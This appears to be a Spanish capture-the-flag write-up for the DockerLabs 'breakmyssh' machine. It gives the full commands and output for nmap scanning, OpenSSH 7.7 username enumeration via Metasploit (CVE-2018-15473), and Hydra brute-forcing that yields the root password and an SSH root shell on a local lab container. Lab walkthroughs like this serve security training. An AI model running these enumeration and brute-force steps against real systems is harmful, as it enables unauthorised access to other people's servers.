---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `OpenSSH` `Metasploit` `Hydra` `Username Enumeration` `CVE-2018-15473`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip breakmyssh.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh breakmyssh.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 17:28 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
```

Vemos que solo el puerto `22` (`SSH`) está abierto y que la versión de `OpenSSH` que corre es la `7.7`.

Esta versión en concreto es vulnerable a enumeración de usuarios, como podemos comprobar tras utilizar `searchsploit`.

```bash
searchsploit OpenSSH 7.7
```

Info:

```
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                               | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                         | linux/remote/45939.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Abrimos Metasploit y empleamos el módulo de `enumusers`.

```js
search openssh
use auxiliary/scanner/ssh/ssh_enumusers 
show options
set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
run
```

Info:

```
[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'man' found
[+] 172.17.0.2:22 - SSH - User 'bin' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'nobody' found
[+] 172.17.0.2:22 - SSH - User 'lovely' found
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed

```

Encontramos un usuario que no es por defecto: `lovely`.

## FUERZA BRUTA

Intentamos un ataque de fuerza bruta sobre este usuario.

```bash
hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
```

Después de 10 minutos aún no se ha encontrado ninguna coincidencia, así que probamos directamente un ataque de `fuerza bruta` sobre el usuario `root`.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 17:40:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

Casi de inmediato obtenemos las credenciales para `root` : `estrella`.

Accedemos por `SSH` como `root`.

```bash
ssh root@172.17.0.2
```

Info:

```
root@54677c43b6f8:~# whoami
root
root@54677c43b6f8:~#
```

Ya somos root !
